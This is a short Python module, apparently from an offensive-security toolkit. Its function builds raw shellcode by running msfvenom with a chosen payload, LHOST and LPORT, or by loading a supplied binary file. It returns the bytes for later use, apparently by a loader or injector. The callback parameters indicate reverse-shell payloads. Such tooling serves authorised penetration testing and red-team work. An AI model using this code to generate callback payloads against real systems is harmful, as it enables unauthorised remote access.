import subprocess
import sys
import os
from ..core.utils import console

def generate(payload, lhost, lport, bin_file=None):
    if bin_file:
        if not os.path.exists(bin_file):
            console.print(f"[bold red][-] Error: {bin_file} not found.[/bold red]")
            sys.exit(1)
        with open(bin_file, 'rb') as f:
            return f.read()
    
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread", "-f", "raw"]
    console.print(f"[bold blue][*] Running: {' '.join(cmd)}[/bold blue]")
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        console.print("[bold red][-] Error running msfvenom:[/bold red]")
        console.print(result.stderr.decode())
        sys.exit(1)
    return result.stdout
